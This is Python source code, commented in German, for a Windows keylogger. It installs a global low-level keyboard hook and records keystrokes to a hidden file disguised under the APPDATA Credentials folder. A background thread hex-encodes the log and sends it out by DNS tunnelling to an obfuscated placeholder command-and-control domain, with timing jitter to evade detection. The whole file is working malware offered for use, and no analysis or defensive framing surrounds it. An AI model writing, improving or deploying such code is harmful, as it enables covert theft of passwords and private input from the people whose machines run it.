import os
import logging
import ctypes
from ctypes import wintypes
import sys
import threading
import time
import binascii
import random
import base64

# Versuch, die DNS-Bibliothek zu importieren. Wenn sie nicht da ist, schlägt der Exfiltrations-Teil fehl, aber der Logger läuft weiter.
try:
    import dns.resolver
except ImportError:
    # Wir können hier keine Nachricht loggen, da das Logging noch nicht konfiguriert ist.
    # Wir setzen die Variable auf None, um das Fehlen zu signalisieren.
    dns = None

# --- Globale Konfiguration ---
LOG_DIR = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Credentials')
LOG_FILE = os.path.join(LOG_DIR, 'user.dat') # Unauffälliger Name für die Log-Datei

# --- STÄHLUNG Stufe 1: String-Verschleierung ---
# Die Domain wird nicht mehr im Klartext gespeichert.
# Führen Sie `echo "your-secret-c2-domain.com" | base64` aus, um Ihren eigenen String zu bekommen.
ENCODED_CONTROL_DOMAIN = b'eW91ci1zZWNyZXQtYzItZG9tYWluLmNvbQ==' # Platzhalter für "your-secret-c2-domain.com"

# --- STÄHLUNG Stufe 1: Jitter ---
BASE_INTERVAL = 600  # 10 Minuten Basis
JITTER = 180         # +/- 3 Minuten Zufallsabweichung

# --- Windows API Definitionen ---
# Wir definieren die notwendigen Strukturen und Konstanten, um direkt mit der WinAPI zu sprechen.
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104

# Pointer-Typen für die Hook-Prozedur
HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)

# Struktur für Tastatur-Ereignisse
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]

# --- Implementierung ---

def setup_stealth():
    # ... unveränderter Code ...
    """
    Stellt die Tarnung für das Log-Verzeichnis sicher.
    Erstellt das Verzeichnis und versucht, es unter Windows zu verstecken.
    """
    try:
        os.makedirs(LOG_DIR, exist_ok=True)
        # Verstecke das Verzeichnis (nur Windows)
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ret = ctypes.windll.kernel32.SetFileAttributesW(LOG_DIR, FILE_ATTRIBUTE_HIDDEN)
        if not ret:
            logging.warning("Could not set 'hidden' attribute on log directory.")
    except Exception as e:
        # Fange alle denkbaren Fehler ab, um einen Crash zu vermeiden.
        # Dies ist wichtig, damit der Logger unter keinen Umständen abstürzt.
        logging.error(f"Failed to setup stealth directory: {e}")

# --- Exfiltrations-Modul ---

def exfiltrate():
    """Liest periodisch die Log-Datei, kodiert die Daten und sendet sie via DNS-Tunneling."""
    if not dns:
        # Wenn die dnspython-Bibliothek nicht installiert ist, kann dieser Thread nichts tun.
        return

    # Dekodiere die Domain nur einmal am Anfang des Threads.
    try:
        control_domain = base64.b64decode(ENCODED_CONTROL_DOMAIN).decode('utf-8')
    except:
        # Wenn die Domain nicht dekodiert werden kann, ist alles verloren. Thread beenden.
        return

    while True:
        # Implementiere Jitter
        sleep_time = BASE_INTERVAL + random.randint(-JITTER, JITTER)
        time.sleep(sleep_time)

        try:
            if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
                continue

            # Lese den Inhalt und sperre die Datei sofort, um Race Conditions zu vermeiden.
            with open(LOG_FILE, "r+") as f:
                data = f.read()
                f.seek(0)
                f.truncate() # Lösche den Inhalt sofort nach dem Lesen.
            
            if not data:
                continue

            # Kodieren der Daten in Hex, um sie URL-sicher zu machen.
            encoded_data = binascii.hexlify(data.encode('utf-8')).decode('utf-8')

            # Aufteilen der Daten in für Subdomains geeignete Chunks (max. 63 Zeichen pro Label).
            chunk_size = 60
            chunks = [encoded_data[i:i + chunk_size] for i in range(0, len(encoded_data), chunk_size)]
            
            session_id = os.urandom(4).hex() # Eindeutige ID für diese Übertragungsserie.

            for chunk in chunks:
                subdomain = f"{chunk}.{session_id}.{control_domain}"
                try:
                    # Führe eine DNS-Anfrage aus. Wir erwarten eine NXDOMAIN-Antwort, das ist OK.
                    # Die Anfrage selbst ist die Datenübertragung.
                    dns.resolver.resolve(subdomain, 'A')
                except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers):
                    # Diese Fehler sind erwartet und bedeuten, dass die Anfrage wahrscheinlich durchgegangen ist.
                    pass
                except Exception:
                    # Bei jedem anderen Fehler, brich ab und versuche es später erneut.
                    # Die Daten sind noch im Speicher und gehen nicht verloren.
                    # Wir schreiben die nicht gesendeten Daten zurück in die Datei.
                    with open(LOG_FILE, "w") as f:
                        f.write(data)
                    break # Beende den aktuellen Sendeversuch.
                time.sleep(0.2) # Kurze Pause, um nicht wie ein DDoS-Angriff auszusehen.

        except Exception:
            # Bei Lese-/Schreibfehlern der Log-Datei, versuche es einfach beim nächsten Mal erneut.
            pass

# Globale Variable für den Hook-Handle, wichtig für das Unhooking.
keyboard_hook = None

def low_level_keyboard_proc(nCode, wParam, lParam):
    """
    Dies ist unsere Callback-Funktion. Sie wird von Windows bei jedem Tastendruck aufgerufen.
    """
    if nCode == 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        # Wir haben einen relevanten Tastendruck.
        # Wir extrahieren die Detailinformationen aus der lParam-Struktur.
        kbd_struct = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk_code = kbd_struct.vkCode
        
        # Protokolliere den virtuellen Key-Code.
        # Dies ist ein numerischer Wert, den wir später übersetzen könnten,
        # aber für die rohe Datensammlung ist er perfekt.
        logging.info(f"VK_CODE: {vk_code}")

    # Geben den Hook an das nächste Programm in der Kette weiter.
    # Dies ist KRITISCH. Wenn wir das nicht tun, friert die gesamte Tastatureingabe des Systems ein!
    return user32.CallNextHookEx(keyboard_hook, nCode, wParam, lParam)

def main():
    """
    Hauptfunktion: Richtet die Tarnung, das Logging und den Low-Level-Hook ein.
    """
    setup_stealth()
    
    logging.basicConfig(filename=LOG_FILE,
                        level=logging.DEBUG,
                        format='%(asctime)s.%(msecs)03d | %(message)s',
                        datefmt='%Y-%m-%d %H:%M:%S')

    # Starte den Exfiltrations-Thread im Hintergrund.
    # daemon=True stellt sicher, dass er beendet wird, wenn das Hauptprogramm endet.
    exfil_thread = threading.Thread(target=exfiltrate, daemon=True)
    exfil_thread.start()

    # Erstelle den Pointer auf unsere Callback-Funktion.
    hook_procedure = HOOKPROC(low_level_keyboard_proc)
    
    # Registriere den globalen Tastatur-Hook.
    global keyboard_hook
    keyboard_hook = user32.SetWindowsHookExW(
        WH_KEYBOARD_LL,
        hook_procedure,
        kernel32.GetModuleHandleW(None), # Handle zur aktuellen Instanz
        0 # Hook für alle Threads im System
    )

    if not keyboard_hook:
        logging.error("Failed to install hook!")
        return

    logging.info("Hook successfully installed. Listening for keystrokes...")

    # Dies ist die klassische Windows-Nachrichtenschleife.
    # Sie hält unser Skript am Leben und verarbeitet die Ereignisse.
    # Ohne sie würde das Skript sofort beendet und der Hook entfernt.
    try:
        msg = wintypes.MSG()
        while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
    except KeyboardInterrupt:
        # Fange Ctrl+C ab, um sauber herunterzufahren (hauptsächlich für Debugging).
        logging.info("Keyboard interrupt received. Uninstalling hook.")
    finally:
        # Stelle sicher, dass der Hook IMMER entfernt wird, wenn das Programm endet.
        user32.UnhookWindowsHookEx(keyboard_hook)
        logging.info("Hook uninstalled. Exiting.")


if __name__ == "__main__":
    main()
